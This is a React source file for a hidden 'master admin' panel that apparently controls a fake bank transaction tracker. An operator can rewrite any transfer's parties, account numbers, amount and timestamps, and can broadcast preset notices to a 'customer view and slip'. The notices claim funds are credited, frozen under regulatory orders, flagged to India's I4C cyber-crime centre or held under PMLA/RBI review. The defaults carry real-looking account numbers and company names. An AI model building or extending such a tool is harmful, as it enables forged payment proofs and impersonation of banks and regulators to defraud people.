import React, { useState, useEffect } from 'react';
import { Transaction, TransactionStatus } from '../types';
import { 
  X, CheckCircle2, ShieldAlert, Lock, Unlock, AlertTriangle, 
  Clock, Ban, Save, Radio, Eye
} from 'lucide-react';

interface AdminPanelModalProps {
  isOpen: boolean;
  onClose: () => void;
  transactions: Transaction[];
  onUpdateStatus: (
    utrId: string, 
    status: TransactionStatus, 
    customNotice?: string, 
    customStage?: string,
    adminNote?: string,
    updatedDetails?: Partial<Transaction>
  ) => void;
  onOpenAccountView: (utrId: string) => void;
}

export const AdminPanelModal: React.FC<AdminPanelModalProps> = ({
  isOpen,
  onClose,
  transactions,
  onUpdateStatus,
  onOpenAccountView
}) => {
  const [selectedUtr, setSelectedUtr] = useState<string>(transactions[0]?.utrId || 'UTR2026091038630430');
  const [saveSuccess, setSaveSuccess] = useState(false);

  const currentTxn = transactions.find(t => t.utrId?.toUpperCase() === selectedUtr?.toUpperCase()) || transactions[0];

  // Editable fields
  const [activeStatus, setActiveStatus] = useState<TransactionStatus>(currentTxn?.status || 'Credited');
  const [noticeText, setNoticeText] = useState(currentTxn?.coolingPeriodNotice || 'Payment Settlement Complete - Funds Successfully Credited to Receiver Account');
  const [stageText, setStageText] = useState(currentTxn?.stage || 'Stage 4 of 4: Account Credited & Settled');
  const [adminNote, setAdminNote] = useState(currentTxn?.adminNote || '');
  
  // Beneficiary details
  const [receiverName, setReceiverName] = useState(currentTxn?.receiverName || 'D CACUS FOUNDATION');
  const [receiverAccount, setReceiverAccount] = useState(currentTxn?.receiverAccount || '0794201003255');
  const [receiverBank, setReceiverBank] = useState(currentTxn?.receiverBank || 'CANARA BANK');
  const [receiverIfsc, setReceiverIfsc] = useState(currentTxn?.receiverIfsc || 'CNRB0003955');
  const [amountFormatted, setAmountFormatted] = useState(currentTxn?.amountFormatted || '125.00 CR INR');
  
  // Remitter / Sender details
  const [senderName, setSenderName] = useState(currentTxn?.senderName || 'GIRIAS INVESTMENT PVT LTD');
  const [senderAccount, setSenderAccount] = useState(currentTxn?.senderAccount || '05230120000032');
  const [senderIfsc, setSenderIfsc] = useState(currentTxn?.senderIfsc || 'HDFC0000509');
  const [senderBranch, setSenderBranch] = useState(currentTxn?.senderBranch || 'BANGALORE BWSSB EXTN COUNTER');
  const [txnDate, setTxnDate] = useState(currentTxn?.date || '10 SEP 2026');
  const [txnTime, setTxnTime] = useState(currentTxn?.time || '15:10:50');

  // Auto-sync form when modal opens or transaction updates
  useEffect(() => {
    if (currentTxn && isOpen) {
      setActiveStatus(currentTxn.status);
      setNoticeText(currentTxn.coolingPeriodNotice || '');
      setStageText(currentTxn.stage || '');
      setAdminNote(currentTxn.adminNote || '');
      setReceiverName(currentTxn.receiverName || '');
      setReceiverAccount(currentTxn.receiverAccount || '');
      setReceiverBank(currentTxn.receiverBank || '');
      setReceiverIfsc(currentTxn.receiverIfsc || '');
      setAmountFormatted(currentTxn.amountFormatted || '');
      setSenderName(currentTxn.senderName || '');
      setSenderAccount(currentTxn.senderAccount || '');
      setSenderIfsc(currentTxn.senderIfsc || '');
      setSenderBranch(currentTxn.senderBranch || '');
      setTxnDate(currentTxn.date || '');
      setTxnTime(currentTxn.time || '');
    }
  }, [isOpen, selectedUtr, currentTxn]);

  if (!isOpen) return null;

  // Status Presets
  const statusOptions: { 
    status: TransactionStatus; 
    label: string; 
    icon: React.ReactNode; 
    color: string; 
    bg: string;
    defaultNotice: string;
    defaultStage: string;
  }[] = [
    {
      status: 'Credited',
      label: '1. Credit / Settled',
      icon: <CheckCircle2 className="w-4 h-4 text-emerald-400" />,
      color: 'border-emerald-500/60 text-emerald-300',
      bg: 'bg-emerald-500/10 hover:bg-emerald-500/20',
      defaultNotice: 'Payment Settlement Complete - Funds Successfully Credited to Receiver Account',
      defaultStage: 'Stage 4 of 4: Account Credited & Settled'
    },
    {
      status: 'Processing',
      label: '2. Cooling Fund (Processing)',
      icon: <Clock className="w-4 h-4 animate-spin text-amber-400" />,
      color: 'border-amber-500/60 text-amber-300',
      bg: 'bg-amber-500/10 hover:bg-amber-500/20',
      defaultNotice: 'Processing Fund - Active Cooling Period Verification in Progress',
      defaultStage: 'Stage 3 of 4: Cooling Period Verification'
    },
    {
      status: 'Freeze',
      label: '3. Freeze (Account / Fund Freeze)',
      icon: <Lock className="w-4 h-4 text-blue-400" />,
      color: 'border-blue-500/60 text-blue-300',
      bg: 'bg-blue-500/10 hover:bg-blue-500/20',
      defaultNotice: 'Account & Transaction Frozen under Central Regulatory Compliance Orders',
      defaultStage: 'HOLD: Inter-Bank Account Freeze'
    },
    {
      status: 'Unfreeze',
      label: '4. Unfreeze (Normal Released)',
      icon: <Unlock className="w-4 h-4 text-teal-400" />,
      color: 'border-teal-500/60 text-teal-300',
      bg: 'bg-teal-500/10 hover:bg-teal-500/20',
      defaultNotice: 'Account Freeze Revoked - Regular Banking Operations Resumed',
      defaultStage: 'Status: Unfrozen / Active'
    },
    {
      status: 'CyberReport',
      label: '5. Cyber Report (Crime Cell Flag)',
      icon: <ShieldAlert className="w-4 h-4 text-purple-400" />,
      color: 'border-purple-500/60 text-purple-300',
      bg: 'bg-purple-500/10 hover:bg-purple-500/20',
      defaultNotice: 'Alert: Transaction Flagged & Reported to Cyber Crime Coordination Centre (I4C)',
      defaultStage: 'FLAGGED: Cyber Crime Investigation Active'
    },
    {
      status: 'BankReport',
      label: '6. Bank Report (Internal Risk Flag)',
      icon: <AlertTriangle className="w-4 h-4 text-rose-400" />,
      color: 'border-rose-500/60 text-rose-300',
      bg: 'bg-rose-500/10 hover:bg-rose-500/20',
      defaultNotice: 'Internal Banking Report: High-Risk Settlement Review under PMLA & RBI Guidelines',
      defaultStage: 'FLAGGED: Internal Vigilance Audit'
    },
    {
      status: 'HoldManager',
      label: '7. Hold Manager (Branch Hold)',
      icon: <Clock className="w-4 h-4 text-orange-400" />,
      color: 'border-orange-500/60 text-orange-300',
      bg: 'bg-orange-500/10 hover:bg-orange-500/20',
      defaultNotice: 'Branch Manager Intervention Required: Transaction on Administrative Clearance Hold',
      defaultStage: 'HOLD: Awaiting Branch Manager Authorization'
    },
    {
      status: 'Chargeback',
      label: '8. Chargeback (Disputed Reversal)',
      icon: <Ban className="w-4 h-4 text-red-400" />,
      color: 'border-red-500/60 text-red-300',
      bg: 'bg-red-500/10 hover:bg-red-500/20',
      defaultNotice: 'Chargeback Raised: Settlement Reversal and Inter-Bank Dispute Claim Initiated',
      defaultStage: 'DISPUTE: Chargeback Claim Processed'
    }
  ];

  // 1-Click Instant Broadcast Override
  const handleQuickStatusClick = (opt: typeof statusOptions[0]) => {
    setActiveStatus(opt.status);
    setNoticeText(opt.defaultNotice);
    setStageText(opt.defaultStage);

    // Broadcast immediately to server & all devices
    if (currentTxn) {
      onUpdateStatus(
        currentTxn.utrId,
        opt.status,
        opt.defaultNotice,
        opt.defaultStage,
        adminNote,
        {
          receiverName,
          receiverAccount,
          receiverBank,
          receiverIfsc,
          amountFormatted,
          senderName,
          senderAccount,
          senderIfsc,
          senderBranch,
          date: txnDate,
          time: txnTime
        }
      );
    }

    setSaveSuccess(true);
    setTimeout(() => setSaveSuccess(false), 2500);
  };

  const handleSave = () => {
    if (!currentTxn) return;
    onUpdateStatus(
      currentTxn.utrId,
      activeStatus,
      noticeText,
      stageText,
      adminNote,
      {
        receiverName,
        receiverAccount,
        receiverBank,
        receiverIfsc,
        amountFormatted,
        senderName,
        senderAccount,
        senderIfsc,
        senderBranch,
        date: txnDate,
        time: txnTime
      }
    );

    setSaveSuccess(true);
    setTimeout(() => setSaveSuccess(false), 2500);
  };

  return (
    <div className="fixed inset-0 z-50 overflow-y-auto bg-slate-950/85 backdrop-blur-md flex items-center justify-center p-3 sm:p-6 animate-fadeIn">
      
      <div className="bg-slate-900 border border-slate-700/80 rounded-2xl w-full max-w-4xl shadow-2xl overflow-hidden flex flex-col text-slate-100 max-h-[92vh]">
        
        {/* Header */}
        <div className="bg-slate-950 px-6 py-4 border-b border-slate-800 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-lg bg-red-600/20 border border-red-500/40 flex items-center justify-center text-red-400">
              <ShieldAlert className="w-5 h-5" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h3 className="font-mono text-base font-bold text-white tracking-wide">
                  MASTER ADMIN CONTROLLER PANEL
                </h3>
                <span className="px-2 py-0.5 rounded text-[10px] font-extrabold bg-red-500/20 text-red-400 border border-red-500/40">
                  SECRET ACCESS (UTR999900001111)
                </span>
              </div>
              <p className="text-xs text-slate-400 font-mono flex items-center gap-1.5 mt-0.5">
                <Radio className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
                <span>Live Multi-Device Instant Broadcast Sync Active</span>
              </p>
            </div>
          </div>

          <button
            onClick={onClose}
            className="p-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-400 hover:text-white transition-all"
            title="Exit Admin Panel"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Content */}
        <div className="p-6 overflow-y-auto space-y-6 flex-1">
          
          {/* Target Transaction Bar */}
          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 flex flex-wrap items-center justify-between gap-3">
            <div>
              <span className="text-[11px] font-mono uppercase text-slate-400 block">Selected Target UTR:</span>
              <span className="font-mono font-bold text-blue-400 text-base">{currentTxn?.utrId}</span>
              <span className="text-xs text-slate-400 ml-2">({currentTxn?.receiverName} - {currentTxn?.amountFormatted})</span>
            </div>

            <div className="flex items-center gap-2">
              <button
                onClick={() => onOpenAccountView(currentTxn.utrId)}
                className="px-3 py-1.5 rounded-lg bg-blue-600/20 hover:bg-blue-600/30 text-blue-300 border border-blue-500/40 text-xs font-bold flex items-center gap-1.5 transition-all"
              >
                <Eye className="w-3.5 h-3.5" />
                <span>Preview Customer View</span>
              </button>
            </div>
          </div>

          {/* 8 Status Selector Grid */}
          <div>
            <label className="block text-xs font-bold uppercase tracking-wider text-slate-300 mb-3 flex items-center justify-between">
              <span>⚡ Select Transaction Status (1-Click Instant Broadcast to All Devices):</span>
              <span className="text-[11px] font-normal text-emerald-400 font-mono">Real-Time Sync</span>
            </label>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
              {statusOptions.map((opt) => {
                const isSelected = activeStatus === opt.status;
                return (
                  <button
                    key={opt.status}
                    onClick={() => handleQuickStatusClick(opt)}
                    className={`p-3 rounded-xl border text-left transition-all relative flex flex-col justify-between gap-2 cursor-pointer active:scale-95 ${
                      isSelected
                        ? `${opt.color} ${opt.bg} ring-2 ring-blue-500/50 shadow-lg`
                        : 'border-slate-800 bg-slate-950/60 hover:bg-slate-800/50 text-slate-300 hover:border-slate-700'
                    }`}
                  >
                    <div className="flex items-center justify-between">
                      {opt.icon}
                      {isSelected && (
                        <span className="px-1.5 py-0.5 rounded text-[9px] font-extrabold bg-white/20 text-white uppercase">
                          ACTIVE
                        </span>
                      )}
                    </div>
                    <div>
                      <p className="text-xs font-bold leading-snug">{opt.label}</p>
                    </div>
                  </button>
                );
              })}
            </div>
          </div>

          {/* Custom Message & Stage Details */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            
            {/* Left: Status Messages */}
            <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 space-y-3">
              <label className="block text-xs font-bold text-slate-300 uppercase tracking-wide">
                Live Status Notice (Displays on Customer View & Slip)
              </label>
              <textarea
                value={noticeText}
                onChange={(e) => setNoticeText(e.target.value)}
                rows={3}
                className="w-full p-2.5 rounded-lg bg-slate-900 border border-slate-700 text-xs text-slate-100 font-sans focus:outline-none focus:ring-1 focus:ring-blue-500"
                placeholder="Payment Settlement Complete - Funds Successfully Credited to Receiver Account"
              />

              <label className="block text-xs font-bold text-slate-300 uppercase tracking-wide pt-1">
                Clearance Stage / Subtitle
              </label>
              <input
                type="text"
                value={stageText}
                onChange={(e) => setStageText(e.target.value)}
                className="w-full p-2 rounded-lg bg-slate-900 border border-slate-700 text-xs text-slate-100 font-sans focus:outline-none focus:ring-1 focus:ring-blue-500"
                placeholder="Stage 4 of 4: Account Credited & Settled"
              />

              <label className="block text-xs font-bold text-slate-300 uppercase tracking-wide pt-1">
                Internal Admin Note (Private Audit Log)
              </label>
              <input
                type="text"
                value={adminNote}
                onChange={(e) => setAdminNote(e.target.value)}
                placeholder="RBI clearance verified ref #38630430"
                className="w-full p-2 rounded-lg bg-slate-900 border border-slate-700 text-xs text-slate-100 focus:outline-none focus:ring-1 focus:ring-blue-500"
              />
            </div>

            {/* Right: Beneficiary & Remitter Controls */}
            <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 space-y-3">
              <label className="block text-xs font-bold text-slate-300 uppercase tracking-wide">
                Beneficiary (Receiver) Details
              </label>
              
              <div className="grid grid-cols-2 gap-2">
                <div>
                  <span className="text-[10px] text-slate-400 block mb-1">Receiver Name:</span>
                  <input
                    type="text"
                    value={receiverName}
                    onChange={(e) => setReceiverName(e.target.value)}
                    className="w-full p-2 rounded-lg bg-slate-900 border border-slate-700 text-xs text-slate-100 font-bold focus:outline-none focus:ring-1 focus:ring-blue-500"
                  />
                </div>
                <div>
                  <span className="text-[10px] text-slate-400 block mb-1">Receiver A/C No:</span>
                  <input
                    type="text"
                    value={receiverAccount}
                    onChange={(e) => setReceiverAccount(e.target.value)}
                    className="w-full p-2 rounded-lg bg-slate-900 border border-slate-700 text-xs text-slate-100 font-mono focus:outline-none focus:ring-1 focus:ring-blue-500"
                  />
                </div>
              </div>

              <div className="grid grid-cols-3 gap-2">
                <div className="col-span-1">
                  <span className="text-[10px] text-slate-400 block mb-1">Bank Name:</span>
                  <input
                    type="text"
                    value={receiverBank}
                    onChange={(e) => setReceiverBank(e.target.value)}
                    className="w-full p-2 rounded-lg bg-slate-900 border border-slate-700 text-xs text-slate-100 focus:outline-none focus:ring-1 focus:ring-blue-500"
                  />
                </div>
                <div>
                  <span className="text-[10px] text-slate-400 block mb-1">Receiver IFSC:</span>
                  <input
                    type="text"
                    value={receiverIfsc}
                    onChange={(e) => setReceiverIfsc(e.target.value)}
                    className="w-full p-2 rounded-lg bg-slate-900 border border-slate-700 text-xs text-slate-100 font-mono focus:outline-none focus:ring-1 focus:ring-blue-500"
                  />
                </div>
                <div>
                  <span className="text-[10px] text-slate-400 block mb-1">Amount Formatted:</span>
                  <input
                    type="text"
                    value={amountFormatted}
                    onChange={(e) => setAmountFormatted(e.target.value)}
                    className="w-full p-2 rounded-lg bg-slate-900 border border-slate-700 text-xs text-slate-100 font-bold text-amber-400 focus:outline-none focus:ring-1 focus:ring-blue-500"
                  />
                </div>
              </div>

              <div className="pt-2 border-t border-slate-800">
                <label className="block text-xs font-bold text-slate-300 uppercase tracking-wide mb-2">
                  Remitter (Sender) Details
                </label>
                <div className="grid grid-cols-2 gap-2">
                  <div>
                    <span className="text-[10px] text-slate-400 block mb-1">Sender Name:</span>
                    <input
                      type="text"
                      value={senderName}
                      onChange={(e) => setSenderName(e.target.value)}
                      className="w-full p-2 rounded-lg bg-slate-900 border border-slate-700 text-xs text-slate-100 font-medium focus:outline-none focus:ring-1 focus:ring-blue-500"
                    />
                  </div>
                  <div>
                    <span className="text-[10px] text-slate-400 block mb-1">Sender A/C No:</span>
                    <input
                      type="text"
                      value={senderAccount}
                      onChange={(e) => setSenderAccount(e.target.value)}
                      className="w-full p-2 rounded-lg bg-slate-900 border border-slate-700 text-xs text-slate-100 font-mono focus:outline-none focus:ring-1 focus:ring-blue-500"
                    />
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-2 mt-2">
                  <div>
                    <span className="text-[10px] text-slate-400 block mb-1">Sender IFSC:</span>
                    <input
                      type="text"
                      value={senderIfsc}
                      onChange={(e) => setSenderIfsc(e.target.value)}
                      className="w-full p-2 rounded-lg bg-slate-900 border border-slate-700 text-xs text-slate-100 font-mono focus:outline-none focus:ring-1 focus:ring-blue-500"
                    />
                  </div>
                  <div>
                    <span className="text-[10px] text-slate-400 block mb-1">Sender Branch:</span>
                    <input
                      type="text"
                      value={senderBranch}
                      onChange={(e) => setSenderBranch(e.target.value)}
                      className="w-full p-2 rounded-lg bg-slate-900 border border-slate-700 text-xs text-slate-100 focus:outline-none focus:ring-1 focus:ring-blue-500"
                    />
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-2 mt-2">
                  <div>
                    <span className="text-[10px] text-slate-400 block mb-1">Date:</span>
                    <input
                      type="text"
                      value={txnDate}
                      onChange={(e) => setTxnDate(e.target.value)}
                      className="w-full p-2 rounded-lg bg-slate-900 border border-slate-700 text-xs text-slate-100 font-mono focus:outline-none focus:ring-1 focus:ring-blue-500"
                    />
                  </div>
                  <div>
                    <span className="text-[10px] text-slate-400 block mb-1">Time:</span>
                    <input
                      type="text"
                      value={txnTime}
                      onChange={(e) => setTxnTime(e.target.value)}
                      className="w-full p-2 rounded-lg bg-slate-900 border border-slate-700 text-xs text-slate-100 font-mono focus:outline-none focus:ring-1 focus:ring-blue-500"
                    />
                  </div>
                </div>

              </div>

            </div>

          </div>

        </div>

        {/* Footer Bar with Action */}
        <div className="bg-slate-950 px-6 py-4 border-t border-slate-800 flex items-center justify-between gap-4">
          <div className="flex items-center gap-2">
            {saveSuccess && (
              <span className="text-xs font-bold text-emerald-400 flex items-center gap-1.5 animate-bounce">
                <CheckCircle2 className="w-4 h-4" />
                Status & Details Broadcasted & Saved Permanently!
              </span>
            )}
          </div>

          <div className="flex items-center gap-3">
            <button
              onClick={onClose}
              className="px-4 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-bold transition-all"
            >
              Close Panel
            </button>
            <button
              onClick={handleSave}
              className="px-6 py-2.5 rounded-xl bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white text-xs font-bold shadow-lg shadow-emerald-600/30 flex items-center gap-2 transition-all active:scale-95"
            >
              <Save className="w-4 h-4" />
              <span>Apply Changes Live</span>
            </button>
          </div>
        </div>

      </div>
    </div>
  );
};
